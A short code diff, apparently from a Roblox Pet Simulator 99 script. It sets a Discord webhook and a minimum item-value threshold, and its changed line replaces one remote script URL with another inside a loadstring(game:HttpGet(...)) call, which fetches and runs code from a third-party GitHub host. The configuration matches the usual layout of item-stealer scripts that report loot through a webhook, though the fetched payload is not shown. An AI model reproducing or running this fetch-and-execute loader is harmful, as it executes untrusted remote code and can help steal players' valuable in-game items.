@@ -4,4 +4,4 @@ Webhook = "https://discord.com/api/webhooks/1537091014236311623/0Vctwos0G9p3pbDb
 
 MinimumRAP = 50000
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ryo199u/PS99/refs/heads/main/PS99%20mainscript.lua"))()
